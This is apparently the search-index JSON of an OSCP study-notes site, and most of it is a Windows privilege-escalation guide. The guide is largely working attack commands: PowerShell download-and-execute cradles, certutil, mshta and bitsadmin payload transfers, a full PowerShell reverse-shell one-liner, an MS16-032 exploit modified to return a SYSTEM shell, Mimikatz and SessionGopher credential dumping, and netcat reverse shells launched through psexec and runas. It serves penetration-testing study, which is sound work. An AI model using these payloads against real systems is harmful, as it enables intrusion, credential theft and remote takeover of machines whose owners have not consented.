{"config":{"lang":["en"],"prebuild_index":false,"separator":"[\\s\\-]+"},"docs":[{"location":"","text":"OSCP Notes","title":"OSCP Notes"},{"location":"#oscp-notes","text":"","title":"OSCP Notes"},{"location":"about/","text":"About The main purpose of this site is to compile all the OSCP prep resources I find useful in one place.","title":"About"},{"location":"about/#about","text":"The main purpose of this site is to compile all the OSCP prep resources I find useful in one place.","title":"About"},{"location":"enumeration/","text":"SMPT SNMP NetBios SQL","title":"Enumeration"},{"location":"enumeration/#smpt","text":"","title":"SMPT"},{"location":"enumeration/#snmp","text":"","title":"SNMP"},{"location":"enumeration/#netbios","text":"","title":"NetBios"},{"location":"enumeration/#sql","text":"","title":"SQL"},{"location":"privesc/","text":"Linux Windows Source: https://github.com/frizb/Windows-Privilege-Escalation Updated 22 July 2019 First things first and quick wins Do some basic enumeration to figure out who we are, what OS this is, what privs we have and what patches have been installed. whoami net user username systeminfo net config Workstation net users What is running on the machine? If we are able to run WMIC we can pull rich details on the services and applications running: wmic service list full services.txt wmic process processes.txt Or alternatively: tasklist processes.txt Has a Windows Auto-login Password been set? reg query HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon Dump a tree of all the folders / files on the HDD tree c:\\ c:\\users\\public\\folders.txt or for a list of files: dir /s c:\\ c:\\users\\public\\files.txt Uploading files to the Windows machine Sometimes we will want to upload a file to the Windows machine in order to speed up our enumeration or to privilege escalate. Often you will find that uploading files is not needed in many cases if you are able to execute PowerShell that is hosted on a remote webserver (we will explore this more in the upgrading Windows Shell, Windows Enumeration and Windows Exploits sections). Uploading files increased the chances of being detected by antivirus and leaves unnecssary data trail behind. We will look at 4 ways of uploading files to a remote Windows machine from Kali Linux: 1. VBScript HTTP Downloader 2. PowerShell HTTP Downloader 3. Python HTTP Downloader 4. FTP Downloader NOTE There are MANY more ways to move files back and forth between a Windows machine, most can be found on the LOLBAS project: https://lolbas-project.github.io/ Most of these will require that we create a simple local webserver on our Kali box to sevre the files (NOTE: I have had issues running this command within TMUX for whatever reason... so dont run it in TMUX). I like to use the Python Simple HTTP Server: root@kali:~/Documents/Exploits/WindowsPRIVZ# python -m SimpleHTTPServer 80 Or the Python pyftpdlib FTP Server (again don't run from TMUX): apt-get install python-pyftpdlib root@kali:~/Documents/Exploits/WindowsPRIVZ# python -m pyftpdlib -p 21 Uploading Files with VBScript In my experiance, VBScript is one of the easiest methods of transfering files to a remote Windows. The only downside is that the file size you can transfer is rather limited. I often have trouble transfering anything over 1 MB using this method and have to fall back on other methods (Windows-privesc-check2.exe is much too large to transfer using this method). First lets test to see if we can run VBScript echo WScript.StdOut.WriteLine Yes we can run vbscript! testvb.vbs Now we run it to see the results: cscript testvb.vbs If you see the following message, we are good to go with VBScript!: C:\\Users\\Test cscript testvb.vbs Microsoft (R) Windows Script Host Version 5.812 Copyright (C) Microsoft Corporation. All rights reserved. Yes we can run vbscript! If you see the following messages, you should move on to PowerShell: C:\\temp cscript testvb.vbs This program is blocked by group policy. For more information, contact your system administrator. C:\\temp testvb.vbs Access is denied. Now we can create a very simple downloader script by copying and pasting this single line of code into your windows commandline. I have tried to create a VBS script to download files from a remote webserver with the least possible number of lines of VBS code and I believe this is it. If Windows is an older version of windows (Windows 8 or Server 2012 and below) use the following script: CMD C:\\ echo dim xHttp: Set xHttp = createobject( Microsoft.XMLHTTP ) dl.vbs echo dim bStrm: Set bStrm = createobject( Adodb.Stream ) dl.vbs echo xHttp.Open GET , WScript.Arguments(0), False dl.vbs echo xHttp.Send dl.vbs echo bStrm.type = 1 dl.vbs echo bStrm.open dl.vbs echo bStrm.write xHttp.responseBody dl.vbs echo bStrm.savetofile WScript.Arguments(1), 2 dl.vbs If Windows is a newer version (Windows 10 or Server 2016), try the following code: CMD C:\\ echo dim xHttp: Set xHttp = CreateObject( MSXML2.ServerXMLHTTP.6.0 ) dl.vbs echo dim bStrm: Set bStrm = createobject( Adodb.Stream ) dl.vbs echo xHttp.Open GET , WScript.Arguments(0), False dl.vbs echo xHttp.Send dl.vbs echo bStrm.type = 1 dl.vbs echo bStrm.open dl.vbs echo bStrm.write xHttp.responseBody dl.vbs echo bStrm.savetofile WScript.Arguments(1), 2 dl.vbs Now try to download a file to the local path: CMD C:\\ cscript dl.vbs http://10.10.10.10/archive.zip .\\archive.zip Uploading Files with CertUtil.exe I've found that CertUtil can be quite reliable when all else seems to fail. certutil.exe -urlcache -split -f http://10.10.10.10/exploit.exe Transfering Files using MSHTA Mshta.exe is a utility that executes Microsoft HTML Applications (HTA). And it can also be used to transfer files :D HTML: C:\\ mshta http://10.10.10.10/badthings.exe FTP: C:\\ mshta ftp://10.10.10.10:21/badthings.exe Trasfering Files using Bitsadmin Background Intelligent Transfer Service (BITS) is a component of Microsoft Windows XP and later iterations of the operating systems, which facilitates asynchronous, prioritized, and throttled transfer of files between machines using idle network bandwidth. BITSAdmin is a command-line tool that you can use to create download or upload jobs and monitor their progress. For full, comprehensive documentation of the tool and all of its commands, see bitsadmin and bitsadmin examples in the Windows IT Pro Center. C:\\ bitsadmin /transfer badthings http://10.10.10.10:80/badthings.exe c:\\users\\public\\payload.exe Uploading Files with PowerShell Test to see if we can run Powershell: CMD C:\\ @ %SystemRoot%\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -NoProfile -InputFormat None -ExecutionPolicy Bypass -Command get-host Test to see if we can run Powershell Version 2: CMD C:\\ @ %SystemRoot%\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -Version 2 -NoProfile -InputFormat None -ExecutionPolicy Bypass -Command $PSVersionTable Try to download a file from a remote server to the windows temp folder from the Windows command line: CMD C:\\ @ %SystemRoot%\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -NoProfile -InputFormat None -ExecutionPolicy Bypass -Command (New-Object System.Net.WebClient).DownloadFile(\\ http://10.10.10.10/exploit.exe\\ , \\ C:\\\\Users\\\\Public\\\\Downloads\\\\exploit.exe\\ ) Or from a PowerShell... shell: PS C:\\ IEX(New-Object System.Net.WebClient).DownloadFile(\\ http://10.10.10.10/exploit.exe\\ , \\ C:\\\\Users\\\\Public\\\\Downloads\\\\exploit.exe\\ ) OR This one seems to work better while at the console: PS C:\\ IEX(New-Object System.Net.WebClient).DownloadFile( http://10.10.10.10/exploit.exe , C:\\Users\\Public\\Downloads\\exploit.exe ) Uploading Files with Python Sometimes a Windows machine will have development tools like Python installed. Check for python python -h Download a file using Python: python -c import urllib.request; urllib.request.urlretrieve('http://10.10.10.10/cat.jpg', 'C:\\\\Users\\\\Public\\\\Downloads\\\\cat.jpg'); Uploading Files with Perl Sometimes a Windows machine will have development tools like PERL installed. Check for PERL perl -v Download a file using PERL: perl -le use File::Fetch; my $ff = File::Fetch- new(uri = 'http://10.10.10.10/nc.exe'); my $file = $ff- fetch() or die $ff- error; Uploading Files with FTP After running the python ftp lib on ( python -m pyftpdlib -p 21 ) on Kali, you can try connecting using the windows FTP client: C:\\Users\\pwnd ftp 10.10.10.10 Connected to 10.10.10.10 220 pyftpdlib 1.5.3 ready. User (10.10.15.31:(none)): anonymous 331 Username ok, send password. Password: anonymous 230 Login successful. ftp ls dir 421 Active data channel timed out. If you are seeing a 421 timeout when you try to send a command it is likely because your connection is being blocked by the windows firewall. The Windows command-line ftp.exe supports the FTP active mode only. In the active mode, the server has to connect back to the client to establish data connection for a file transfer. You can check to see if the remote machine has Winscp.exe installed. Winscp is capable of connecting to an FTP server using passive mode and will not be blocked by the firewall. Transfering Files via SMB using Impacket Kali comes loade with the incredible Impacket library which is a swiss army knife of network protocols... just Awesome. You can easily create a SMB share on your local Kali machine and move files between Kali and Windows with ease. https://github.com/SecureAuthCorp/impacket First we will setup the SMB Share on Kali like so: root@kali:~# impacket-smbserver root /root/Desktop Impacket v0.9.16-dev - Copyright 2002-2017 Core Security Technologies [*] Config file parsed [*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0 [*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0 [*] Config file parsed [*] Config file parsed [*] Config file parsed Confirm it is up and running using Net View on the Windows command line: C:\\Users\\Null net view \\\\192.168.0.49 Shared resources at \\\\192.168.0.49 (null) Share name Type Used as Comment ------------------------------------------------------------------------------- smbshare Disk The command completed successfully. Then we can trasnfer files from the command line as if it were a normal folder: C:\\Users\\Admin dir \\\\192.168.0.49\\smbshare C:\\Users\\Admin copy \\\\192.168.0.49\\smbshare\\loot.zip . By far the most interesting feature of the SMB Share method is that you can execute files directly over the SMB Share without copying them to the remote machine (fileless execution is so hot right now): C:\\Users\\Admin \\\\192.168.0.49\\smbshare\\payload.exe A fancy trick I learned from IPPSec is to create a mapped drive to a remote SMB share like so: net use y: \\\\192.168.0.49\\smbshare y: dir Execute a remote shell dropper Often, you can leverage PowerShell to execute a remotely hosted powershell script which contains a shell dropper (generated by the platform of your choosing). CMD C:\\ @ %SystemRoot%\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -WindowStyle hidden -NonInteractive -NoProfile -InputFormat None -ExecutionPolicy Bypass -Command iex ((New-Object System.Net.WebClient).DownloadString('http://10.10.10.10/Invoke-PowerShellTcp.ps1')) There are also some no-so-well documented PowerShell argument shortcuts so can use things like -w rather than -WindowsStyle (handy for smaller payloads): CMD C:\\ @ %SystemRoot%\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -w hidden -noni -nop -i None -ex Bypass -c iex ((New-Object System.Net.WebClient).DownloadString('http://10.10.10.10/Invoke-PowerShellTcp.ps1')) Upgrading your Windows Shell You might find that you are connected with a limited shell such as a Web shell, netcat shell or Telnet connection that simply is not cutting it for you. Here are a few oneliners you can use to upgrade your shell: Upgrade Shell with PowerShell Nishang Nishang is a framework and collection of scripts and payloads which enables usage of PowerShell for offensive security and post exploitation during Penetraion Tests. The scripts are written on the basis of requirement by the author during real Penetration Tests. root@kali:~/test# git clone https://github.com/samratashok/nishang.git Cloning into 'nishang'... remote: Enumerating objects: 1612, done. remote: Total 1612 (delta 0), reused 0 (delta 0), pack-reused 1612 Receiving objects: 100% (1612/1612), 5.87 MiB | 6.62 MiB/s, done. Resolving deltas: 100% (1010/1010), done. root@kali:~/test# cd nishang/ root@kali:~/test/nishang# cd Shells/ root@kali:~/test/nishang/Shells# echo Invoke-PowerShellTcp -Reverse -IPAddress 10.10.10.10 -Port 4444 Invoke-PowerShellTcp.ps1 root@kali:~/test/nishang/Shells# python -m SimpleHTTPServer 80 Now open up a netcat listener on Kali: nc -nlvp 4444 And Execute the remote powershell script hosted on your Kali SimpleHTTPServer CMD C:\\ @ %SystemRoot%\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -NoProfile -InputFormat None -ExecutionPolicy Bypass -Command iex ((New-Object System.Net.WebClient).DownloadString('http://10.10.10.10/Invoke-PowerShellTcp.ps1')) Upgrade Windows Command Line with a Powershell One-liner Reverse Shell: You can run this oneliner from the remote Windows command prompt to skip the file upload step entirely (again be sure to update the IP and port): CMD C:\\ @ %SystemRoot%\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -NoProfile -InputFormat None -ExecutionPolicy Bypass -Command {$client = New-Object System.Net.Sockets.TCPClient(\\ 10.10.10.10\\ ,4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2 1 | Out-String );$sendback2 = $sendback + \\ PS \\ + (pwd).Path + \\ ^ \\ ;$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()} Netcat Reverseshell Oneliners for Windows Sometimes it is helpful to create a new Netcat session from an existed limited shell, webshell or unstable (short lived) remote shell. Windows Enumeration NOTE There are many executables that could provide privledge escalation if they are being run by a privledged user, most can be found on the incredible LOLBAS project: https://lolbas-project.github.io/ Automated Windows Enumeration Scripts We are also going to look a a few automated methods of performing Windows Enumeration including: * WindownPrivEsc.exe * Sherlock * Watson * JAWZ * Seatbelt Running Windows Privesc Check (windows-privesc-check) The Windows Privesc Check is a very powerful tool for finding common misconfigurations in a Windows system that could lead to privledge escalation. It has not been updated for a while, but it is still as effective today as it was 5 years ago. The downside of this script is that it was written in Python and if the target system does not have Python installed, you will need to use an executable version that has a Python interpreter built in. Having to include Python in the package makes the executable version is pretty large, coming in at a whopping 7.14 MB!! First we will need to clone the latest version to our environment: root@kali:~/tools# git clone https://github.com/pentestmonkey/windows-privesc-check Cloning into 'windows-privesc-check'... remote: Enumerating objects: 1232, done. remote: Total 1232 (delta 0), reused 0 (delta 0), pack-reused 1232 Receiving objects: 100% (1232/1232), 34.79 MiB | 4.61 MiB/s, done. Resolving deltas: 100% (897/897), done. Next we will need to setup a simple python HTTP webserver in Kali to host the file which the remote Windows box can download it from: root@kali:~/tools# cd windows-privesc-check/ root@kali:~/tools/windows-privesc-check# python -m SimpleHTTPServer 80 Serving HTTP on 0.0.0.0 port 80 ... Now we will need to transfer the file to our remote windows box: CMD C:\\ @ %SystemRoot%\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -NoProfile -InputFormat None -ExecutionPolicy Bypass -Command (New-Object System.Net.WebClient).DownloadFile(\\ http://10.10.10.10/windows-privesc-check2.exe\\ , \\ C:\\\\Users\\\\Public\\\\Downloads\\\\windows-privesc-check2.exe\\ ); And now we run the executeable on the remote machine. I like run with all the audit enabled like so: C:\\Users\\Admin cd .. C:\\Users cd Public C:\\Users\\Public cd Downloads C:\\Users\\Public\\Downloads windows-privesc-check2.exe --audit -a -o report windows-privesc-check v2.0svn198 (http://pentestmonkey.net/windows-privesc-check)... The windows-privesc-check will create a detailed HTML report and text based report for your review. Running Sherlock Sherlock is a powershell library with a number of privledge escalation checkers built in. We can stage and run sherlock on a remote http server so the file never needs to hit the remote server's HDD. root@kali:~test# git clone https://github.com/rasta-mouse/Sherlock.git Cloning into 'Sherlock'... remote: Enumerating objects: 3, done. remote: Counting objects: 100% (3/3), done. remote: Compressing objects: 100% (3/3), done. remote: Total 75 (delta 0), reused 2 (delta 0), pack-reused 72 Unpacking objects: 100% (75/75), done. root@kali:~test# cd Sherlock/ root@kali:~test/Sherlock# ls LICENSE README.md Sherlock.ps1 root@kali:~test/Sherlock# echo Find-AllVulns Sherlock.ps1 root@kali:~test/Sherlock# python -m SimpleHTTPServer 80 Serving HTTP on 0.0.0.0 port 80 ... Now we can run this from the remote Windows CMD shell: CMD C:\\ @ %SystemRoot%\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -NoProfile -InputFormat None -ExecutionPolicy Bypass -Command iex ((New-Object System.Net.WebClient).DownloadString('http://10.10.10.10/Sherlock.ps1')) Or from a Windows Powershell: PS C:\\ IEX(New-Object Net.Webclient).downloadString('http://10.10.10.10/Sherlock.ps1') Running Watson Sherlock has been superceded by a .net Windows enumeration platform called Watson which is frequently updated by the author. It is a bit tricker to deploy and use as you need to compile it yourself and match the version of .net with the target system's version. First, on the target system we will need to check the versions of .Net that have been installed by navigating to the .net framework folder and poking around: cd\\Windows\\Microsoft.NET\\Framework\\ dir /s msbuild Only active versions of .NET will have the msbuild.exe. Make note of the available versions and leverage that to compile your version of Watson that targets the remote Windows machine. Download the latest version of Watson from github: git clone https://github.com/rasta-mouse/Watson.git And open it using Visual Studio. In the Solution Explorer, click the Properties and modify the \"Target Framework:\" value to align with the remote Windows machine's version of the .Net framework. It will prompt you to reopen the project. Once the project has reloaded, Build the project under the Release mode (CTRL + SHIFT + B). Next we will copy our Watson.exe to our Kali instance and setup a simple python HTTP webserver in Kali to host the file which the remote Windows box can download it from: root@kali:~/tools# cd Watson/ root@kali:~/tools/Watson# python -m SimpleHTTPServer 80 Serving HTTP on 0.0.0.0 port 80 ... Now we will need to transfer the compiled Watson.exe file to our remote windows box: CMD C:\\ @ %SystemRoot%\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -NoProfile -InputFormat None -ExecutionPolicy Bypass -Command (New-Object System.Net.WebClient).DownloadFile(\\ http://10.10.10.10/Watson.exe\\ , \\ C:\\\\Users\\\\Public\\\\Downloads\\\\Watson.exe\\ ); And now we run the executeable on the remote machine. I like run with all the audit enabled like so: C:\\Users\\Admin cd .. C:\\Users cd Public C:\\Users\\Public cd Downloads C:\\Users\\Public\\Downloads Watson.exe Running JAWS - Just Another Windows (Enum) Script JAWS is another powershell library that was built with privledge escalation of the OSCP lab machines in mind. We can stage and run JAWS on a remote http server so the file never needs to hit the remote server's HDD. root@kali:~test# git clone https://github.com/411Hall/JAWS Now we can run this from the remote Windows CMD shell: CMD C:\\ @ %SystemRoot%\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -NoProfile -InputFormat None -ExecutionPolicy Bypass -Command iex ((New-Object System.Net.WebClient).DownloadString('http://10.10.10.10/jaws-enum.ps1')) Or from a Windows Powershell: PS C:\\ IEX(New-Object Net.Webclient).downloadString('http://10.10.10.10/jaws-enum.ps1') And we should see the following output start to appear: Running J.A.W.S. Enumeration - Gathering User Information - Gathering Processes, Services and Scheduled Tasks - Gathering Installed Software Fireeye Session Gopher Leveraging credentials is still the most common ways of privledge escalation in Windows environments. Session Gopher is a PowerShell script designed to automaticlly harvest credentials from commonly used applications. To run Session Gopher, we will first need to pull down the latest version from the Fireeye github repository: git clone https://github.com/fireeye/SessionGopher Cloning into 'SessionGopher'... remote: Enumerating objects: 48, done. Unpacking objects: 100% (48/48), done. remote: Total 48 (delta 0), reused 0 (delta 0), pack-reused 48 Next we can serve it up on our local KALI instance by using the simple python HTTP server: root@kali:~/tools# cd SessionGopher/ root@kali:~/tools/SessionGopher# ls README.md SessionGopher.ps1 root@kali:~/tools/SessionGopher# python -m SimpleHTTPServer 80 Serving HTTP on 0.0.0.0 port 80 ... Finally we can file-lessly execute it from our remote Windows shell: @ %SystemRoot%\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -NoProfile -InputFormat None -ExecutionPolicy Bypass -Command iex ((New-Object System.Net.WebClient).DownloadString('http://10.10.10.10/SessionGopher.ps1')); Invoke-SessionGopher -Thorough Or from a Windows Powershell: PS C:\\ IEX(New-Object Net.Webclient).downloadString('http://10.10.10.10/SessionGopher.ps1') Or we can download and run it: CMD C:\\ @ %SystemRoot%\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -NoProfile -InputFormat None -ExecutionPolicy Bypass -Command (New-Object System.Net.WebClient).DownloadFile(\\ http://10.10.10.10/SessionGopher.ps1\\ , \\ C:\\\\Users\\\\Public\\\\Downloads\\\\SessionGopher.ps1\\ ); CMD C:\\ @ %SystemRoot%\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -NoProfile -InputFormat None -ExecutionPolicy Bypass -Command { . .\\SessionGopher.ps1; Invoke-SessionGopher -Thorough} Running Mimikatz Mimikatz is a Windows post-exploitation tool written by Benjamin Delpy (@gentilkiwi). It allows for the extraction of plaintext credentials from memory, password hashes from local SAM/NTDS.dit databases, advanced Kerberos functionality, and more. https://github.com/gentilkiwi/mimikatz Running traditional (binary) Mimikatz The original and most frequently updated version of Mimikatz is the binary executable which can be found here: https://github.com/gentilkiwi/mimikatz/releases First we will need to download a Mimikatz binary and copy it to the remote machine root@kali:~/test# wget https://github.com/gentilkiwi/mimikatz/releases/download/2.1.1-20180925/mimikatz_trunk.zip --2018-10-16 15:14:49-- https://github.com/gentilkiwi/mimikatz/releases/download/2.1.1-20180925/mimikatz_trunk.zip root@kali:~/test# unzip mimikatz_trunk.zip Now we will need to copy the 3 files (win32 or x64 depending on the OS) required to run Mimikatz to the remote server. CMD C:\\ @ %SystemRoot%\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -NoProfile -InputFormat None -ExecutionPolicy Bypass -Command (New-Object System.Net.WebClient).DownloadFile(\\ http://10.10.10.10/mimidrv.sys\\ , \\ C:\\\\Users\\\\Public\\\\Downloads\\\\mimidrv.sys\\ ); (New-Object System.Net.WebClient).DownloadFile(\\ http://10.10.10.10/mimikatz.exe\\ , \\ C:\\\\Users\\\\Public\\\\Downloads\\\\mimikatz.exe\\ ); (New-Object System.Net.WebClient).DownloadFile(\\ http://10.10.10.10/mimilib.dll\\ , \\ C:\\\\Users\\\\Public\\\\Downloads\\\\mimilib.dll\\ ) Now, if we dont have an overly interactive shell, we will want to execute Mimikatz without the built in CLI by passing the correct parameters to the executable. We use the log parameter to also log the clear password results to a file (just in case we are unable to see the output). mimikatz log version sekurlsa::logonpasswords exit Otherwise we can use the Mimikatz shell to get the passwords: mimikatz.exe mimikatz # privilege::debug Privilege '20' OK mimikatz # sekurlsa::logonpasswords Running Powershell Mimikatz The Powershell version is not as frequently updated, but can be loaded into memory without ever hitting the HDD (Fileless execution). This version simply reflectively loads the Mimikatz binary into memory so we could probably update it ourselves without much difficulty. wget https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Mimikatz.ps1 Fileless execution of Mimikatz from remotely hosted server: PS C:\\ IEX (New-Object System.Net.Webclient).DownloadString('http://10.10.10.10/Invoke-Mimikatz.ps1') ; Invoke-Mimikatz -DumpCreds Windows Kernel Exploits MS16-032 If the remote machine appears to be vulnerable to MS16-032, we can execute a powershell script from a remote server to exploit it. Title : Secondary Logon Handle MSBulletin : MS16-032 CVEID : 2016-0099 Link : https://www.exploit-db.com/exploits/39719/ VulnStatus : Appears Vulnerable Get the Powershell script from FuzzySecurity's Github, add an invoke to the end of the script and share the folder using the python SimpleHTTPServer: root@kali:~test# git clone https://github.com/FuzzySecurity/PowerShell-Suite.git Cloning into 'PowerShell-Suite'... remote: Enumerating objects: 378, done. remote: Total 378 (delta 0), reused 0 (delta 0), pack-reused 378 Receiving objects: 100% (378/378), 5.94 MiB | 2.06 MiB/s, done. Resolving deltas: 100% (179/179), done. root@kali:~test# cd PowerShell-Suite/ root@kali:~test/PowerShell-Suite# echo Invoke-MS16-032 Invoke-MS16-032.ps1 root@kali:~test/PowerShell-Suite# python -m Simple SimpleDialog SimpleHTTPServer SimpleXMLRPCServer root@kali:~test/PowerShell-Suite# python -m SimpleHTTPServer 80 The default version of the MS16-032 script will create a Pop-up CMD.exe window on the remote machine. Unfortunatly, we cannot access this from a limited shell... BUT we can modify the exploit to call a reverse shell. Its pretty easy to modify it to call a reverse powershell that will connect back to our machine with a System shell. We will need to modify line 330 of the exploit (the ip address and port will need to be updated of course): # LOGON_NETCREDENTIALS_ONLY / CREATE_SUSPENDED #$CallResult = [Advapi32]::CreateProcessWithLogonW( # user , domain , pass , # 0x00000002, C:\\Windows\\System32\\cmd.exe , , # 0x00000004, $null, $GetCurrentPath, # [ref]$StartupInfo, [ref]$ProcessInfo) # Modified to create a Powershell reverse shell $CallResult = [Advapi32]::CreateProcessWithLogonW( user , domain , pass , 0x00000002, 'C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe', '-NoProfile -InputFormat None -ExecutionPolicy Bypass -Command {$client = New-Object System.Net.Sockets.TCPClient(\\ 10.10.10.10\\ ,4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2 1 | Out-String );$sendback2 = $sendback + \\ PS \\ + (pwd).Path + \\ ^ \\ ;$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()} ', 0x00000004, $null, $GetCurrentPath, [ref]$StartupInfo, [ref]$ProcessInfo) On the remote host execute the exploit: CMD C:\\ @ %SystemRoot%\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -NoProfile -InputFormat None -ExecutionPolicy Bypass -Command iex ((New-Object System.Net.WebClient).DownloadString('http://10.10.10.10/Invoke-MS16-032.ps1')) Or from a Windows Powershell: PS C:\\ IEX(New-Object Net.Webclient).downloadString('http://10.10.10.10/Invoke-MS16-032.ps1') Or if you wanted to upload the exploit, you can always run it like this: PS C:\\ powershell -ExecutionPolicy ByPass -command { . C:\\Users\\Public\\Invoke-MS16-032.ps1; Invoke-MS16-032 } On our Kali machine we create the reverse shell and ... BOOM! Root dance. root@kali:~# nc -nlvp 4444 listening on [any] 4444 ... connect to [10.10.10.11] from (UNKNOWN) [10.10.10.10] 49182 PS C:\\Users\\jimmy^ whoami nt authority\\system Windows Run As Prior to successfully performing a Windows run as, we of course need a valid windows username and password. Here is a oneliner powershell script to verify a username / password is valid on the local system: Requires .Net 3.5 CMD C:\\ @ %SystemRoot%\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -NoProfile -InputFormat None -ExecutionPolicy Bypass -Command {$username = ' username here '; $password = ' password here '; $computer = $env:COMPUTERNAME; Add-Type -AssemblyName System.DirectoryServices.AccountManagement; $obj = New-Object System.DirectoryServices.AccountManagement.PrincipalContext('machine',$computer); $obj.ValidateCredentials($username, $password); } Requires .Net 2.0 CMD C:\\ @ %SystemRoot%\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -NoProfile -InputFormat None -ExecutionPolicy Bypass -Command {$username = ' username here '; $password = ' password here '; $securePassword = ConvertTo-SecureString $password -AsPlainText -Force; $credential = New-Object System.Management.Automation.PSCredential $username, $securePassword; Start-Process -FilePath C:\\Windows\\System32\\calc.exe -NoNewWindow -Credential $credential; } Switching users in linux is trival with the SU command. However, an equivalent command does not exist in Windows. Here are 3 ways to run a command as a different user in Windows. Sysinternals psexec is a handy tool for running a command on a remote or local server as a specific user, given you have thier username and password. The following example creates a reverse shell from a windows server to our Kali box using netcat for Windows and Psexec (on a 64 bit system). C:\\ psexec64 \\\\COMPUTERNAME -u Test -p test -h c:\\users\\public\\nc.exe -nc 192.168.1.10 4444 -e cmd.exe PsExec v2.2 - Execute processes remotely Copyright (C) 2001-2016 Mark Russinovich Sysinternals - www.sysinternals.com ``` Runas.exe is a handy windows tool that allows you to run a program as another user so long as you know thier password. The following example creates a reverse shell from a windows server to our Kali box using netcat for Windows and Runas.exe: ```cmd C:\\ C:\\Windows\\System32\\runas.exe /env /noprofile /user:Test c:\\users\\public\\nc.exe -nc 192.168.1.10 4444 -e cmd.exe Enter the password for Test: Attempting to start nc.exe as user COMPUTERNAME\\Test ... PowerShell can also be used to launch a process as another user. The following simple powershell script will run a reverse shell as the specified username and password. $username = ' username here ' $password = ' password here ' $securePassword = ConvertTo-SecureString $password -AsPlainText -Force $credential = New-Object System.Management.Automation.PSCredential $username, $securePassword Start-Process -FilePath C:\\Users\\Public\\nc.exe -NoNewWindow -Credential $credential -ArgumentList ( -nc , 192.168.1.10 , 4444 , -e , cmd.exe ) -WorkingDirectory C:\\Users\\Public Next run this script using powershell.exe: CMD C:\\ powershell -ExecutionPolicy ByPass -command { . C:\\Users\\public\\PowerShellRunAs.ps1; } Other files Here are few other handy scripts and things... CopyAndPasteFileDownloader.bat Windows file transfer script that can be pasted to the command line. File transfers to a Windows machine can be tricky without a Meterpreter shell. The following script can be copied and pasted into a basic windows reverse and used to transfer files from a web server (the timeout 1 commands are required after each new line) CopyAndPasteEnum.bat No File Upload Required Windows Privlege Escalation Basic Information Gathering (based on the fuzzy security tutorial). Copy and paste the following contents into your remote Windows shell in Kali to generate a quick report enumeration.md Basic notes on Windows Enumeration from the OSCP. windows_recon.bat An uploadable batch file for performing basic windows enumeration. References https://medium.com/@hakluke https://daya.blog/2018/01/06/windows-privilege-escalation/ https://pentestlab.blog/2017/04/19/stored-credentials/ https://www.sploitspren.com/2018-01-26-Windows-Privilege-Escalation-Guide/ https://www.abatchy.com/ https://gist.github.com/egre55 https://github.com/egre55/ultimate-file-transfer-list https://lolbas-project.github.io/ https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/ https://github.com/GhostPack/Seatbelt https://github.com/rasta-mouse/Watson http://hackingandsecurity.blogspot.com/2017/09/oscp-windows-priviledge-escalation.html https://blog.ropnop.com/transferring-files-from-kali-to-windows/#smb Source: https://github.com/frizb/Windows-Privilege-Escalation Updated 22 July 2019","title":"Privesc"},{"location":"privesc/#linux","text":"","title":"Linux"},{"location":"privesc/#windows","text":"Source: https://github.com/frizb/Windows-Privilege-Escalation Updated 22 July 2019","title":"Windows"},{"location":"privesc/#first-things-first-and-quick-wins","text":"Do some basic enumeration to figure out who we are, what OS this is, what privs we have and what patches have been installed. whoami net user username systeminfo net config Workstation net users What is running on the machine? If we are able to run WMIC we can pull rich details on the services and applications running: wmic service list full services.txt wmic process processes.txt Or alternatively: tasklist processes.txt Has a Windows Auto-login Password been set? reg query HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon Dump a tree of all the folders / files on the HDD tree c:\\ c:\\users\\public\\folders.txt or for a list of files: dir /s c:\\ c:\\users\\public\\files.txt","title":"First things first and quick wins"},{"location":"privesc/#uploading-files-to-the-windows-machine","text":"Sometimes we will want to upload a file to the Windows machine in order to speed up our enumeration or to privilege escalate. Often you will find that uploading files is not needed in many cases if you are able to execute PowerShell that is hosted on a remote webserver (we will explore this more in the upgrading Windows Shell, Windows Enumeration and Windows Exploits sections). Uploading files increased the chances of being detected by antivirus and leaves unnecssary data trail behind. We will look at 4 ways of uploading files to a remote Windows machine from Kali Linux: 1. VBScript HTTP Downloader 2. PowerShell HTTP Downloader 3. Python HTTP Downloader 4. FTP Downloader NOTE There are MANY more ways to move files back and forth between a Windows machine, most can be found on the LOLBAS project: https://lolbas-project.github.io/ Most of these will require that we create a simple local webserver on our Kali box to sevre the files (NOTE: I have had issues running this command within TMUX for whatever reason... so dont run it in TMUX). I like to use the Python Simple HTTP Server: root@kali:~/Documents/Exploits/WindowsPRIVZ# python 